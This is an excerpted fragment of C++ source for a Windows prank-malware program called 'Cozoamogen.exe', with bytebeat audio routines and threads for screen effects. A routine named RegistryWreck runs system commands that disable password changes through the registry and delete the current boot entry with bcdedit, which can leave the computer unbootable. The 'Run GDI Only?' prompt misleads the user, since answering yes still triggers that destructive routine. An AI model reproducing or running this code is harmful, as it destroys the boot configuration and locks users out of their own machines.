...
DWORD WINAPI enableTaskManager(LPVOID lpParam) {
...
VOID WINAPI sound2() {
	...
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t & 7 : 16) + (1 & t >> 14)) >> (3 & t >> (t & 2048 ? 2 : 10)) >> (3 & t >> 8) | t >> (t & 4096 ? 2 : 3)));
...
VOID WINAPI sound3() {
	...
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t << 2 ^ t >> 4 & t << 4 & t ^ 7 ^ t << 1 & t >> 4));
...
VOID WINAPI sound7() {
	...
	char buffer[8000 * 29] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * (t >> 16 | t >> 8) * t));
...
DWORD WINAPI RegistryWreck(LPVOID lpParam) {
	...
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
	system("bcdedit /delete {current}");
	MessageBox(NULL, L"Error Has Occured Registry delete itself!", L"Nice Try But Im Not Done Yet!", MB_ICONERROR);
	return 1;
}
...
{
	if (MessageBoxW(NULL, L"Run GDI Only?", L"Cozoamogen.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		...
		else
		{
			...
			HANDLE thread4dot1 = CreateThread(0, 0, Sinewave, 0, 0, 0);
			//HANDLE thread1dot1 = CreateThread(0, 0, payload1, 0, 0, 0);
			system("echo done");
			sound4();
			Sleep(30000);
			...
			CreateThread(0, 0, RegistryWreck, 0, 0, 0);
			//HANDLE thread1dot1 = CreateThread(0, 0, payload1, 0, 0, 0);
			sound7();
			Sleep(29000);
			...
			HANDLE thread11 = CreateThread(0, 0, cur, 0, 0, 0);
			HANDLE thread12 = CreateThread(0, 0, icons1, 0, 0, 0);
			sound10();
			Sleep(30000);
		}
	}
